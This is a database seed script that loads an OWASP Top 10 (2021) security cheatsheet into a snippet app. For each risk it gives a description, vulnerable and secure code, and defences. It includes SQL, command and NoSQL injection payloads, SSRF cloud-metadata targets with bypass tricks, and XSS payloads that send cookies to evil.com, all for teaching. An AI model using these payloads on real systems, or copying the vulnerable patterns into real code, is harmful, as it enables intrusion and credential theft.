import { PrismaClient } from "@prisma/client";

const prisma = new PrismaClient();

async function main() {

  await prisma.category.deleteMany({
    where: { name: "OWASP Top 10", userId: null },
  });

  const owasp = await prisma.category.create({
    data: {
      name: "OWASP Top 10",
      icon: "🔐",
      color: "red",
      description: "OWASP Top 10 (2021) web application security risks: descriptions, attack examples, vulnerable code patterns, and concrete defences",
      isPublic: true,
      snippets: {
        create: [
          // ── A01 Broken Access Control ─────────────────────────────────────
          {
            title: "A01 — Broken Access Control",
            description: "Enforcing restrictions on authenticated users — the most common critical vulnerability",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0, language: "text", label: "What it is",
                  content: `DESCRIPTION
  Access control enforces policy so users cannot act outside their
  intended permissions. Failures lead to unauthorised data disclosure,
  modification, or destruction.

COMMON WEAKNESSES
  • Insecure Direct Object Reference (IDOR): /invoice?id=1042
    → change to id=1043 and see another user's invoice
  • Missing function-level access control: non-admin GETs /admin/users
  • Privilege escalation: regular user performs admin action
  • CORS misconfiguration allowing untrusted origins
  • JWT with "alg: none" or weak secret accepted by server
  • Force browsing past access checks (e.g. /account/settings without login)
  • Elevation of privilege: acting as admin without being logged in

REAL IMPACT
  An attacker enumerates IDs to exfiltrate all user records,
  or a regular user calls an admin API to grant themselves privileges.`,
                },
                {
                  order: 1, language: "javascript", label: "Vulnerable vs secure code",
                  content: `// ❌ VULNERABLE — no ownership check
app.get("/api/orders/:id", authenticate, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  res.json(order);  // returns ANY order if you know the ID
});

// ✅ SECURE — verify resource belongs to the requesting user
app.get("/api/orders/:id", authenticate, async (req, res) => {
  const order = await db.orders.findOne({
    id: req.params.id,
    userId: req.user.id,   // ownership check
  });
  if (!order) return res.status(404).json({ error: "Not found" });
  res.json(order);
});

// ❌ VULNERABLE — client-supplied role
app.post("/api/promote", authenticate, async (req, res) => {
  const { userId, role } = req.body;  // attacker sends role: "admin"
  await db.users.update(userId, { role });
});

// ✅ SECURE — server-side role check
app.post("/api/promote", authenticate, requireRole("admin"), async (req, res) => {
  const { userId } = req.body;
  await db.users.update(userId, { role: "moderator" }); // role is fixed server-side
});`,
                },
                {
                  order: 2, language: "text", label: "Defences",
                  content: `DEFENCES
  ✓ Deny by default — access is forbidden unless explicitly granted
  ✓ Implement access control once, reuse throughout (don't duplicate logic)
  ✓ Enforce ownership on every resource read/write (not just list views)
  ✓ Log access control failures; alert on repeated failures (IDOR scanning)
  ✓ Rate-limit API endpoints to slow enumeration attacks
  ✓ Use indirect references (UUIDs / opaque tokens) instead of sequential IDs
  ✓ Validate JWT signatures server-side; reject "alg: none"
  ✓ Set CORS policy to explicitly named trusted origins only
  ✓ Invalidate server-side session tokens on logout
  ✓ Test access control with automated integration tests that cross user boundaries`,
                },
              ],
            },
          },
          // ── A02 Cryptographic Failures ────────────────────────────────────
          {
            title: "A02 — Cryptographic Failures",
            description: "Failures related to cryptography exposing sensitive data in transit or at rest",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0, language: "text", label: "What it is",
                  content: `DESCRIPTION
  Formerly "Sensitive Data Exposure". Focuses on failures related to
  cryptography (or lack of it) that expose sensitive data — passwords,
  credit cards, health records, PII, business secrets.

COMMON WEAKNESSES
  • Data transmitted in clear text (HTTP, SMTP, FTP)
  • Weak or old algorithms: MD5, SHA-1, DES, RC4, ECB mode
  • Default or weak crypto keys; keys committed to source control
  • Missing TLS certificate validation
  • Passwords stored as plain text or with weak hash (MD5, SHA-1 unsalted)
  • Deprecated protocols: TLS 1.0/1.1, SSL 2/3
  • Sensitive data cached in browser (no-store not set)
  • Predictable IVs or nonces in CBC mode`,
                },
                {
                  order: 1, language: "python", label: "Vulnerable vs secure password storage",
                  content: `import hashlib, bcrypt, secrets

# ❌ VULNERABLE — plain text
db.save({"password": password})

# ❌ VULNERABLE — MD5 (no salt, fast, broken)
hashed = hashlib.md5(password.encode()).hexdigest()

# ❌ VULNERABLE — SHA-256 without salt (rainbow table attack possible)
hashed = hashlib.sha256(password.encode()).hexdigest()

# ✅ SECURE — bcrypt (slow, salted, designed for passwords)
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# Verify:
bcrypt.checkpw(password.encode(), hashed)

# ✅ SECURE — Argon2 (winner of Password Hashing Competition)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=2)
hashed = ph.hash(password)
ph.verify(hashed, password)

# ❌ VULNERABLE — ECB mode (patterns visible in ciphertext)
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_ECB)

# ✅ SECURE — AES-GCM (authenticated encryption, random nonce)
nonce = secrets.token_bytes(12)
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
ciphertext, tag = cipher.encrypt_and_digest(plaintext)`,
                },
                {
                  order: 2, language: "text", label: "Defences",
                  content: `DEFENCES
  ✓ Classify data by sensitivity; apply appropriate protection level
  ✓ Don't store sensitive data you don't need (data minimisation)
  ✓ Encrypt all data at rest using AES-256 or ChaCha20-Poly1305
  ✓ Enforce TLS 1.2+ for all connections; use HSTS
  ✓ Use strong, modern algorithms: AES-GCM, RSA-OAEP, ECDH, Ed25519
  ✓ Never use: MD5, SHA-1, DES, 3DES, RC4, ECB mode for sensitive data
  ✓ Hash passwords with bcrypt, scrypt, or Argon2 (never MD5/SHA-1)
  ✓ Generate cryptographically random keys and IVs (use secrets module)
  ✓ Store keys in a secret manager (Vault, AWS KMS) — never in source code
  ✓ Set Cache-Control: no-store on responses containing sensitive data
  ✓ Disable TLS 1.0/1.1, SSL 2/3; disable weak cipher suites`,
                },
              ],
            },
          },
          // ── A03 Injection ─────────────────────────────────────────────────
          {
            title: "A03 — Injection",
            description: "SQL, NoSQL, OS command, LDAP injection — untrusted data sent to an interpreter",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0, language: "text", label: "What it is",
                  content: `DESCRIPTION
  Injection flaws occur when untrusted data is sent to an interpreter as
  part of a command or query. An attacker can trick the interpreter into
  executing unintended commands or accessing data without authorisation.

TYPES
  • SQL Injection — most common; manipulates database queries
  • NoSQL Injection — MongoDB operator injection ($where, $gt)
  • OS Command Injection — shell metacharacters in system calls
  • LDAP Injection — manipulates directory service queries
  • XPath / XML Injection
  • Template Injection (SSTI) — in Jinja2, Twig, Freemarker
  • Log Injection — injects fake log entries or CRLF sequences

CLASSIC SQL INJECTION PAYLOADS
  ' OR '1'='1                         -- always-true condition
  '; DROP TABLE users; --             -- destructive
  ' UNION SELECT username,password FROM users --   -- data exfil
  admin'--                            -- bypass login`,
                },
                {
                  order: 1, language: "python", label: "Vulnerable vs secure code",
                  content: `import sqlite3, subprocess, shlex

# ❌ VULNERABLE — SQL injection via string concatenation
def get_user(username):
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    return db.execute(query)
# Input: ' OR '1'='1  →  returns all users

# ✅ SECURE — parameterised query (prepared statement)
def get_user(username):
    return db.execute("SELECT * FROM users WHERE username = ?", (username,))

# ✅ SECURE — ORM (SQLAlchemy)
user = session.query(User).filter(User.username == username).first()

# ❌ VULNERABLE — OS command injection
def ping_host(host):
    output = subprocess.check_output("ping -c 1 " + host, shell=True)
# Input: "8.8.8.8; cat /etc/passwd"  →  exfiltrates /etc/passwd

# ✅ SECURE — avoid shell=True, pass args as list
def ping_host(host):
    output = subprocess.check_output(["ping", "-c", "1", host])

# ❌ VULNERABLE — NoSQL injection (MongoDB)
# Input: {"username": {"$gt": ""}, "password": {"$gt": ""}}
user = db.users.find_one({"username": req["username"], "password": req["password"]})

# ✅ SECURE — validate types before querying
def login(username: str, password: str):
    if not isinstance(username, str) or not isinstance(password, str):
        raise ValueError("Invalid input")
    user = db.users.find_one({"username": username, "password": hash_password(password)})`,
                },
                {
                  order: 2, language: "text", label: "Defences",
                  content: `DEFENCES
  ✓ Use parameterised queries / prepared statements — ALWAYS
  ✓ Use an ORM, but still validate inputs (ORMs can be misused)
  ✓ Validate and whitelist input: type, length, format, range
  ✓ Escape special characters when parameterisation isn't possible
  ✓ Never use shell=True; pass args as a list to subprocess
  ✓ Least privilege DB accounts — app user shouldn't own schema
  ✓ Disable dangerous DB features (xp_cmdshell in SQL Server)
  ✓ Use WAF as a defence-in-depth layer (not primary defence)
  ✓ Scan code with SAST tools (Semgrep, Bandit, CodeQL)
  ✓ Run automated DAST scans (OWASP ZAP, Burp Suite)`,
                },
              ],
            },
          },
          // ── A04 Insecure Design ───────────────────────────────────────────
          {
            title: "A04 — Insecure Design",
            description: "Missing or ineffective security controls due to flaws in design, not implementation",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0, language: "text", label: "What it is & defences",
                  content: `DESCRIPTION
  A new category in 2021 focusing on risks related to design and
  architectural flaws — different from implementation bugs.
  "Insecure design cannot be fixed by perfect implementation."

COMMON WEAKNESSES
  • No threat modelling during design phase
  • Business logic flaws: can a user skip steps in a checkout flow?
  • Missing rate limiting on sensitive functions (OTP, password reset)
  • Password reset via security questions (easily guessed/researched)
  • Credential recovery that reveals the password instead of resetting it
  • Trusting user-supplied values for business-critical decisions
    (e.g. price, discount, account tier sent from the client)
  • Missing anti-automation controls (CAPTCHAs, device fingerprinting)
  • Allowing unlimited account creation / resource consumption

EXAMPLE
  A cinema ticketing app allows booking of 15 seats, then releasing
  them in the last second — no limit on how many times a user can do this.
  Design flaw: no reservation expiry or anti-automation check.

DEFENCES
  ✓ Threat modelling: use STRIDE, PASTA, or LINDDUN during design
  ✓ Write security user stories and misuse cases alongside features
  ✓ Validate all security-relevant values server-side (price, role, qty)
  ✓ Apply rate limiting on authentication, OTP, password reset, signup
  ✓ Limit resource consumption per user / IP / session
  ✓ Use multi-factor authentication for sensitive actions
  ✓ Segregate layers — don't trust frontend; enforce in backend
  ✓ Security design review before any feature ships
  ✓ Use reference architectures and proven security libraries`,
                },
              ],
            },
          },
          // ── A05 Security Misconfiguration ─────────────────────────────────
          {
            title: "A05 — Security Misconfiguration",
            description: "Missing hardening, unnecessary features enabled, default credentials, verbose errors",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0, language: "text", label: "What it is",
                  content: `DESCRIPTION
  The most commonly seen issue. Insecure defaults, incomplete configurations,
  open cloud storage, verbose error messages, unnecessary features, and
  missing security hardening across any part of the stack.

COMMON WEAKNESSES
  • Default credentials unchanged (admin/admin, root/root)
  • S3 buckets / blob storage publicly readable or writable
  • Directory listing enabled on web server
  • Detailed error messages / stack traces returned to users in prod
  • Unnecessary services, ports, pages, accounts, or privileges enabled
  • Missing security headers (CSP, HSTS, X-Frame-Options, etc.)
  • Cloud security groups with 0.0.0.0/0 on sensitive ports (DB, SSH)
  • XML external entity processing enabled (see A05 / XXE)
  • Default TLS certificates with weak keys
  • Debug mode enabled in production (Django DEBUG=True, etc.)`,
                },
                {
                  order: 1, language: "bash", label: "Security headers & hardening",
                  content: `# ✅ Recommended HTTP security headers (Nginx example)
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';" always;

# ✅ Disable server version disclosure
server_tokens off;                        # Nginx
# ServerTokens Prod                       # Apache

# ✅ Disable directory listing
autoindex off;                            # Nginx
# Options -Indexes                        # Apache

# Check headers with curl
curl -I https://example.com

# ✅ Find default/weak credentials
# Change all defaults before deploying any service

# ✅ Scan for misconfigs (AWS)
aws s3api get-bucket-acl --bucket my-bucket
aws s3api get-public-access-block --bucket my-bucket

# ✅ Check security group exposure
aws ec2 describe-security-groups --query \
  "SecurityGroups[?IpPermissions[?IpRanges[?CidrIp=='0.0.0.0/0']]]"`,
                },
                {
                  order: 2, language: "text", label: "Defences",
                  content: `DEFENCES
  ✓ Repeatable hardening process: build secure base images / IaC
  ✓ Minimal platform — remove unused features, components, docs, samples
  ✓ Review and update all security configurations during patching
  ✓ Segment architecture — network, container, cloud IAM boundaries
  ✓ Send security headers on every HTTP response
  ✓ Never return stack traces or internal paths to end users
  ✓ Use generic error messages; log details server-side
  ✓ Automated misconfiguration scanning in CI/CD (Trivy, Checkov, tfsec)
  ✓ Periodic review of cloud IAM permissions, storage ACLs, security groups
  ✓ Enable and audit cloud-native security tools (AWS GuardDuty, Security Hub)
  ✓ Rotate all default credentials immediately on deployment`,
                },
              ],
            },
          },
          // ── A06 Vulnerable & Outdated Components ──────────────────────────
          {
            title: "A06 — Vulnerable & Outdated Components",
            description: "Using components with known vulnerabilities in libraries, frameworks, and dependencies",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0, language: "text", label: "What it is",
                  content: `DESCRIPTION
  Components (libraries, frameworks, OS, runtimes) run with the same
  privileges as the application. If a vulnerable component is exploited,
  it can result in serious data loss or a server takeover.

COMMON WEAKNESSES
  • Not knowing versions of all components in use (no SBOM)
  • Running outdated, unsupported, or unpatched software
  • Not scanning for vulnerabilities regularly (no CVE monitoring)
  • Not fixing/upgrading underlying platforms timely
  • Not testing compatibility of updated libraries before deploying
  • Including unused but vulnerable dependencies
  • Using abandoned / unmaintained packages

NOTABLE EXAMPLES
  Log4Shell (CVE-2021-44228) — Log4j RCE, CVSS 10.0
  Heartbleed (CVE-2014-0160) — OpenSSL memory leak
  Struts2 (CVE-2017-5638)    — Apache Struts RCE (Equifax breach)
  event-stream npm package    — supply chain attack, malicious code injected`,
                },
                {
                  order: 1, language: "bash", label: "Scanning & remediation",
                  content: `# npm — audit dependencies
npm audit
npm audit fix
npm audit fix --force       # upgrades breaking changes too
npm outdated                # show outdated packages

# Python — scan with safety or pip-audit
pip-audit
pip list --outdated
safety check -r requirements.txt

# Docker image scanning
trivy image myapp:latest
docker scout cves myapp:latest
grype myapp:latest

# Java — OWASP Dependency Check
dependency-check --project myapp --scan ./lib

# Go
govulncheck ./...

# Ruby
bundle audit

# GitHub Dependabot (automatic PRs for vulnerable deps)
# Add .github/dependabot.yml to enable

# Snyk
snyk test
snyk monitor`,
                },
                {
                  order: 2, language: "text", label: "Defences",
                  content: `DEFENCES
  ✓ Maintain a Software Bill of Materials (SBOM) for all dependencies
  ✓ Continuously monitor CVE databases (NVD, OSV, GitHub Advisory)
  ✓ Automate dependency scanning in CI/CD (Dependabot, Snyk, Trivy)
  ✓ Subscribe to security mailing lists for your key components
  ✓ Remove unused dependencies, features, files, and documentation
  ✓ Pin exact versions; review and test updates before deploying
  ✓ Use packages from official, reputable sources only
  ✓ Scan container base images; use minimal images (distroless, Alpine)
  ✓ Apply virtual patches (WAF rules) while permanent fix is prepared
  ✓ Have a documented patch response SLA based on CVSS severity`,
                },
              ],
            },
          },
          // ── A07 Authentication Failures ───────────────────────────────────
          {
            title: "A07 — Identification & Authentication Failures",
            description: "Weaknesses in authentication, session management, and credential handling",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0, language: "text", label: "What it is",
                  content: `DESCRIPTION
  Attacks on identity, authentication, and session management allow
  attackers to assume the identity of other users, temporarily or
  permanently.

COMMON WEAKNESSES
  • Weak or no brute-force protection (no lockout, no rate limit)
  • Permitting weak passwords ("123456", "password")
  • Plain text, encrypted, or weakly hashed passwords (MD5, SHA-1)
  • Ineffective credential recovery (security questions, email-only reset)
  • Missing or ineffective multi-factor authentication
  • Exposed session IDs in URLs (?sessionid=abc123)
  • Session not invalidated on logout or after inactivity
  • Session tokens not rotated after successful login (session fixation)
  • Predictable session tokens (sequential IDs, low entropy)
  • Accepting expired or revoked JWTs (no server-side invalidation)`,
                },
                {
                  order: 1, language: "javascript", label: "Secure session & auth patterns",
                  content: `// ✅ Rate limit login attempts
const rateLimit = require("express-rate-limit");
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 10,                    // 10 attempts per window
  message: "Too many login attempts, please try again later",
});
app.post("/auth/login", loginLimiter, loginHandler);

// ✅ Rotate session after login (prevent session fixation)
app.post("/auth/login", async (req, res) => {
  const user = await verifyCredentials(req.body);
  if (!user) return res.status(401).json({ error: "Invalid credentials" });
  req.session.regenerate((err) => {   // new session ID on login
    req.session.userId = user.id;
    res.json({ ok: true });
  });
});

// ✅ Invalidate session on logout
app.post("/auth/logout", (req, res) => {
  req.session.destroy(() => {
    res.clearCookie("connect.sid");
    res.json({ ok: true });
  });
});

// ✅ Secure cookie settings
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,    // no JS access
    secure: true,      // HTTPS only
    sameSite: "strict",// CSRF protection
    maxAge: 30 * 60 * 1000,  // 30 min inactivity timeout
  },
}));`,
                },
                {
                  order: 2, language: "text", label: "Defences",
                  content: `DEFENCES
  ✓ Enforce multi-factor authentication (TOTP, passkeys, hardware keys)
  ✓ Implement account lockout or exponential backoff after failed attempts
  ✓ Rate-limit login, registration, and password reset endpoints
  ✓ Reject weak passwords; check against known-breached lists (HaveIBeenPwned API)
  ✓ Hash passwords with bcrypt, scrypt, or Argon2 — never MD5/SHA-1
  ✓ Generate cryptographically random session tokens (128+ bits entropy)
  ✓ Never expose session IDs in URLs — use cookies only
  ✓ Set cookies: HttpOnly, Secure, SameSite=Strict
  ✓ Invalidate sessions server-side on logout
  ✓ Rotate session IDs after privilege level change (login, sudo, etc.)
  ✓ Set absolute and idle timeouts on sessions
  ✓ Use battle-tested auth libraries (Passport, Auth0, Keycloak)
  ✓ Avoid building authentication from scratch`,
                },
              ],
            },
          },
          // ── A08 Software and Data Integrity ──────────────────────────────
          {
            title: "A08 — Software & Data Integrity Failures",
            description: "Insecure CI/CD pipelines, unsigned updates, insecure deserialisation",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0, language: "text", label: "What it is & defences",
                  content: `DESCRIPTION
  New in 2021. Relates to code and infrastructure that does not protect
  against integrity violations. Includes insecure deserialisation and
  CI/CD pipeline attacks (supply chain).

COMMON WEAKNESSES
  • Loading plugins, libraries, or updates from untrusted sources
  • CDN resources without Subresource Integrity (SRI) hashes
  • Auto-update mechanisms without cryptographic signature verification
  • Insecure deserialisation of untrusted data (Java, PHP, Python pickle)
  • Unsigned or unverified CI/CD pipeline artifacts
  • Compromised build tools / poisoned dependencies (supply chain)
  • Trusting client-supplied serialised objects without validation

EXAMPLES
  SolarWinds: build pipeline compromised → malicious code in signed update
  event-stream npm: abandoned package taken over, backdoor added
  PHP pickle / Java ObjectInputStream RCE via crafted serialised object

INSECURE DESERIALISATION ATTACK
  Attacker sends crafted serialised object → server deserialises it →
  attacker-controlled gadget chain executes arbitrary code (RCE)

DEFENCES
  ✓ Use digital signatures for packages, artifacts, and container images
  ✓ Add SRI hashes to all CDN/third-party <script> and <link> tags
  ✓ Verify signatures before installing updates or plugins
  ✓ Pin dependency versions and checksums (lock files, Sigstore)
  ✓ Never deserialise data from untrusted sources in formats like
    Java serialisation, PHP unserialize(), Python pickle
  ✓ Use data-only serialisation formats (JSON, Protobuf) instead
  ✓ If you must deserialise: implement integrity checks and run in low-privilege
    sandboxed environment before processing
  ✓ Secure CI/CD: least-privilege pipeline permissions, signed commits,
    protected branches, audit logs, SLSA supply chain framework`,
                },
                {
                  order: 1, language: "html", label: "Subresource Integrity (SRI)",
                  content: `<!-- ❌ VULNERABLE — no integrity check, CDN can serve malicious code -->
<script src="https://cdn.example.com/jquery.min.js"></script>

<!-- ✅ SECURE — SRI hash ensures content hasn't been tampered with -->
<script
  src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"
  integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
  crossorigin="anonymous">
</script>

<!-- Generate SRI hash -->
<!-- openssl dgst -sha256 -binary jquery.min.js | openssl base64 -A -->
<!-- Or: https://www.srihash.org/ -->

<!-- ✅ Also pin your own first-party scripts with CSP hashes -->
<!-- Content-Security-Policy: script-src 'sha256-abc123...' -->`,
                },
              ],
            },
          },
          // ── A09 Security Logging & Monitoring ─────────────────────────────
          {
            title: "A09 — Security Logging & Monitoring Failures",
            description: "Insufficient logging, monitoring, and alerting that allows breaches to go undetected",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0, language: "text", label: "What it is",
                  content: `DESCRIPTION
  Without logging and monitoring, breaches cannot be detected. The
  average time to detect a breach is over 200 days — usually detected
  by external parties, not internal monitoring.

COMMON WEAKNESSES
  • Loggable events (logins, failed logins, high-value transactions) not logged
  • Warnings and errors generate no or inadequate log messages
  • Logs not monitored for suspicious activity
  • Logs only stored locally (lost if server is compromised)
  • Log entries lack sufficient context (who, what, when, where)
  • Penetration tests and DAST scans don't trigger alerts
  • Alerting thresholds too high; alerts not acted on
  • Sensitive data (passwords, tokens, PII) written to logs

WHAT MUST BE LOGGED
  • All authentication events (success and failure)
  • Access control failures (403s, IDOR attempts)
  • Input validation failures (especially repeated)
  • High-value transactions
  • Session management events (create, destroy, timeout)
  • Admin / privileged actions
  • Errors and exceptions (without sensitive data)`,
                },
                {
                  order: 1, language: "javascript", label: "Structured security logging",
                  content: `// ✅ Structured logging with security context (using pino)
const logger = require("pino")();

// Log authentication events
function logAuthEvent(event, req, user, success) {
  logger.info({
    event,
    success,
    userId:    user?.id ?? null,
    ip:        req.ip,
    userAgent: req.get("User-Agent"),
    timestamp: new Date().toISOString(),
    // ❌ NEVER log: passwords, tokens, secrets, full credit card numbers
  });
}

// Login handler
app.post("/auth/login", async (req, res) => {
  const user = await verifyCredentials(req.body.username, req.body.password);
  if (!user) {
    logAuthEvent("login_failure", req, null, false);
    return res.status(401).json({ error: "Invalid credentials" });
  }
  logAuthEvent("login_success", req, user, true);
  // ...
});

// Log access control failures
app.use((req, res, next) => {
  res.on("finish", () => {
    if (res.statusCode === 403 || res.statusCode === 401) {
      logger.warn({
        event:  "access_denied",
        method: req.method,
        path:   req.path,
        userId: req.user?.id,
        ip:     req.ip,
        status: res.statusCode,
      });
    }
  });
  next();
});`,
                },
                {
                  order: 2, language: "text", label: "Defences",
                  content: `DEFENCES
  ✓ Log all authentication events, access control failures, and admin actions
  ✓ Include: timestamp, user ID, IP, session ID, event type, outcome
  ✓ Never log sensitive data: passwords, tokens, secrets, full PAN, SSN
  ✓ Use structured logging (JSON) for machine-parseable log entries
  ✓ Ship logs to a centralised, tamper-resistant system (SIEM, ELK, Splunk)
  ✓ Retain logs long enough to support breach investigation (90 days+)
  ✓ Set up automated alerting for:
      - Brute force (N failed logins in T seconds)
      - Impossible travel (login from two distant IPs in short time)
      - Mass data access (user exporting thousands of records)
      - Privilege escalation attempts
  ✓ Establish and test an incident response plan
  ✓ Include security event monitoring in on-call runbooks`,
                },
              ],
            },
          },
          // ── A10 SSRF ──────────────────────────────────────────────────────
          {
            title: "A10 — Server-Side Request Forgery (SSRF)",
            description: "Server fetches a remote resource using attacker-controlled URL",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0, language: "text", label: "What it is",
                  content: `DESCRIPTION
  SSRF flaws occur when a web application fetches a remote resource using
  a user-supplied URL without validating it. The attacker can force the
  server to make requests to internal services, cloud metadata endpoints,
  or other unintended destinations.

COMMON ATTACK TARGETS
  • Cloud metadata services:
    AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
    GCP:   http://metadata.google.internal/computeMetadata/v1/
    Azure: http://169.254.169.254/metadata/instance
  • Internal services: http://localhost:6379 (Redis), http://10.0.0.5:8080
  • Internal admin panels: http://internal-admin.corp/
  • File system via file:// scheme
  • Port scanning internal network

BYPASS TECHNIQUES ATTACKERS USE
  • 127.0.0.1, 0.0.0.0, [::1], localhost
  • Decimal IP: http://2130706433  (= 127.0.0.1)
  • Octal IP:   http://017700000001
  • URL shorteners pointing to internal IPs
  • DNS rebinding: domain resolves to public IP then re-resolves to internal
  • Redirects: public URL → 302 → internal URL`,
                },
                {
                  order: 1, language: "python", label: "Vulnerable vs secure code",
                  content: `import httpx
from urllib.parse import urlparse
import ipaddress

# ❌ VULNERABLE — fetches any URL the user provides
def fetch_url(url: str):
    return httpx.get(url).text

# ✅ SECURE — allowlist of permitted domains
ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

def fetch_url_safe(url: str) -> str:
    parsed = urlparse(url)

    # Only allow HTTPS
    if parsed.scheme != "https":
        raise ValueError("Only HTTPS URLs are allowed")

    # Allowlist check
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError(f"Host {parsed.hostname} is not allowed")

    return httpx.get(url, follow_redirects=False).text

# ✅ Block private/reserved IP ranges (defence in depth)
def is_safe_ip(hostname: str) -> bool:
    try:
        ip = ipaddress.ip_address(hostname)
        return not (ip.is_private or ip.is_loopback or
                    ip.is_link_local or ip.is_reserved)
    except ValueError:
        return True  # hostname, not IP — let DNS resolve then recheck

# ✅ AWS: use IMDSv2 which requires a PUT token (limits SSRF access)
# Disable IMDSv1 on all EC2 instances:
# aws ec2 modify-instance-metadata-options \\
#   --instance-id i-xxx --http-tokens required`,
                },
                {
                  order: 2, language: "text", label: "Defences",
                  content: `DEFENCES
  ✓ Allowlist permitted remote resources by domain, IP, port, and scheme
  ✓ Do not accept raw URLs from users — use IDs that server maps to URLs
  ✓ Block all non-HTTP/HTTPS schemes: file://, gopher://, dict://, ftp://
  ✓ Validate that resolved IPs are not private, loopback, or link-local
  ✓ Do not follow redirects; or re-validate the redirect destination
  ✓ Enforce network-level controls — outbound firewall rules from app tier
  ✓ Isolate resource-fetching services in a dedicated DMZ with no internal access
  ✓ Disable unused URL schemes and HTTP redirections on servers
  ✓ Use IMDSv2 on AWS EC2 (require PUT token); block 169.254.169.254 at network
  ✓ Log all outbound HTTP requests from application servers
  ✓ Do not return raw server responses to the client (leaks internal info)`,
                },
              ],
            },
          },
          // ── XSS — bonus A03 adjacent ──────────────────────────────────────
          {
            title: "Cross-Site Scripting (XSS)",
            description: "Reflected, stored, and DOM-based XSS — injecting scripts into web pages",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0, language: "text", label: "Types & payloads",
                  content: `TYPES OF XSS
  Reflected XSS — payload in URL, executed immediately in response
    URL: /search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>

  Stored XSS — payload saved in database, executed for every visitor
    Comment field: <img src=x onerror="document.location='https://evil.com?c='+document.cookie">

  DOM-based XSS — payload never hits the server; exploits client-side JS
    URL: /page#<img src=x onerror=alert(1)>
    Vulnerable: document.getElementById("x").innerHTML = location.hash;

COMMON BYPASS PAYLOADS
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  javascript:alert(1)                     (href / src attributes)
  <a href="javascript:alert(1)">click</a>
  "><script>alert(1)</script>             (break out of attribute)
  '--><script>alert(1)</script>           (break out of JS string/HTML comment)

IMPACT
  Session hijacking (steal cookies), credential theft, keylogging,
  defacement, drive-by malware download, CSRF bypass`,
                },
                {
                  order: 1, language: "javascript", label: "Vulnerable vs secure code",
                  content: `// ❌ VULNERABLE — directly setting innerHTML
document.getElementById("output").innerHTML = userInput;

// ❌ VULNERABLE — React dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// ✅ SECURE — use textContent for plain text
document.getElementById("output").textContent = userInput;

// ✅ SECURE — React renders text safely by default
<div>{userContent}</div>

// ✅ SECURE — sanitise HTML when rich text is truly needed
import DOMPurify from "dompurify";
const clean = DOMPurify.sanitize(dirtyHTML);
document.getElementById("output").innerHTML = clean;

// ✅ SECURE — Content Security Policy (HTTP header)
// Prevents inline scripts and restricts script sources
// Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';

// ✅ SECURE — server-side output encoding (Node.js / Express)
const escapeHtml = (str) =>
  str.replace(/&/g, "&amp;")
     .replace(/</g, "&lt;")
     .replace(/>/g, "&gt;")
     .replace(/"/g, "&quot;")
     .replace(/'/g, "&#x27;");`,
                },
                {
                  order: 2, language: "text", label: "Defences",
                  content: `DEFENCES
  ✓ Context-aware output encoding:
    - HTML body:         HTML entity encoding  (&lt; &gt; &amp;)
    - HTML attribute:    Attribute encoding    (&quot;)
    - JavaScript:        JS Unicode escaping   (\\uXXXX)
    - CSS:               CSS hex escaping
    - URL parameter:     Percent encoding
  ✓ Use modern frameworks that auto-escape by default (React, Vue, Angular)
  ✓ Never use innerHTML, document.write(), or eval() with user data
  ✓ Sanitise with DOMPurify when rich HTML input is required
  ✓ Implement a strict Content Security Policy (CSP)
  ✓ Set HttpOnly on session cookies — limits damage from XSS
  ✓ Enable X-Content-Type-Options: nosniff
  ✓ Use Trusted Types API for DOM manipulation in modern browsers
  ✓ Validate input on server (type, length, allowlist of characters)
  ✓ Scan with DAST tools: OWASP ZAP, Burp Suite, Nikto`,
                },
              ],
            },
          },
        ],
      },
    },
  });

  console.log(`✅ Created OWASP Top 10 cheatsheet: ${owasp.name} (${owasp.id})`);
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(() => prisma.$disconnect());
